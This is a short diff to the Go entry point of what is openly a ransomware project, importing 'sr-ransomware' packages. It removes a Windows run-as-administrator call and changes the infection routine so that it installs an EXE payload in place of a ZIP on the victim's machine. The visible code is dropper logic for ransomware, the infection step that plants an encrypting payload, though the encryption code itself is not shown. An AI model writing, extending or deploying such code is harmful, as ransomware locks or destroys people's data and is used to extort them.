@@ -1,15 +1,8 @@
 package main
 
-import (
-    "github.com/sug0/sr-ransomware/go/win"
-    "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
-)
+import "github.com/sug0/sr-ransomware/go/crypto/scheme/victim"
 
 //go:generate go run generate/cryptoservice_buffer.go
-
-func init() {
-    win.RunAsAdmin()
-}
 
 func main() {
     done := make(chan struct{})
@@ -30,5 +23,5 @@ func runInfection(done chan<- struct{}) {
     if err != nil {
         return
     }
-    victim.InstallPayload(cryptoserviceZIP)
+    victim.InstallPayload(cryptoserviceEXE)
 }
